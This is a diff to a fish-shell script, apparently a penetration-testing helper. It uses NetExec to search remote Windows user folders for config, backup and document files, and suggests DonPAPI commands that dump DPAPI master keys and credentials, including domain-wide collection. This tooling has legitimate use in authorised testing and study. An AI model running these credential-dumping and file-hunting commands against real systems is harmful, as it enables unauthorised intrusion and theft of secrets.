@@ -185,7 +185,7 @@ Examples:
     nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$' | sort -u
 
     ezpz_info "Searching for interesting files in user folders"
-    set cmd "Get-ChildItem -Path C:/Users -Force -Recurse -Depth 3 -Include *.config,*.xml,*.json,*.yml,*.yaml,*.log,*.bak,*.old, *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ps1,*.bat, *.exe -ErrorAction SilentlyContinue | Select-Object FullName"
+    set cmd "Get-ChildItem -Path C:/Users -Force -Recurse -Depth 3 -Include *.config,*.xml,*.json,*.yml,*.yaml,*.log,*.bak,*.old, *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ps1,*.bat, *.exe -ErrorAction SilentlyContinue | Select-Object"
     ezpz_cmd $cmd
     nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$' | grep -vi 'appdata' | grep -vi 'local settings' | grep -vi 'application data' | grep -vi 'all users' | sort -u
 
@@ -292,8 +292,9 @@ Examples:
         end
 
         if test -n "$donpapi_auth_arg_string"
-            ezpz_cmd "Next Step: Try dumping DPAPI master keys and credentials with DonPAPI:"
-            ezpz_info "donpapi collect -t $target -u \"$_flag_username\" $donpapi_auth_arg_string --ntfile \"$this_target_parsed_file"
+            ezpz_info "Next Step: Try dumping DPAPI master keys and credentials with DonPAPI:"
+            ezpz_cmd "donpapi collect -t $target -u \"$_flag_username\" $donpapi_auth_arg_string --ntfile \"$this_target_parsed_file"
+            ezpz_cmd "[DC] donpapi collect -u \"$_flag_username\" $donpapi_auth_arg_string -d $_flag_domain --dc-ip $target -t ALL --fetch-pvk"
         else
             ezpz_warn "DonPAPI suggestion skipped: No password or hash provided for authentication."
         end
